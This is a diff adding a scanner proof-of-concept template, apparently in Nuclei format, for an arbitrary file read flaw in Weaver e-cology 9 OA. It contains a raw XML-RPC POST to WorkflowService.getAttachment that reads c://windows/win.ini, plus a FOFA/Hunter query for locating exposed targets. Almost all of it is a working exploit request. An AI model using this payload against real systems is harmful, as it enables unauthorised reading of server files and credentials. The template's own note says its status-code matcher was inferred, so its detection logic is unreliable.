@@ -1,0 +1,54 @@
+id: poc-0c1009d385fbd30c5cd5
+info:
+  name: 泛微e-cology9XmlRpcServlet存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/0c1009d385fbd30c5cd5e1c6af9d1992
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 0c1009d385fbd30c5cd5e1c6af9d1992
+    fofa: + hunter`app.name=="泛微 e-cology 9.0 OA"`
+http:
+- raw:
+  - 'POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Content-Type: application/xml
+
+    Accept-Encoding: gzip
+
+    Content-Length: 201
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <methodCall>
+
+    <methodName>WorkflowService.getAttachment</methodName>
+
+
+    <params>
+
+    <param>
+
+    <value><string>c://windows/win.ini</string></value>
+
+
+    </param>
+
+
+    </params>
+
+
+    </methodCall>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
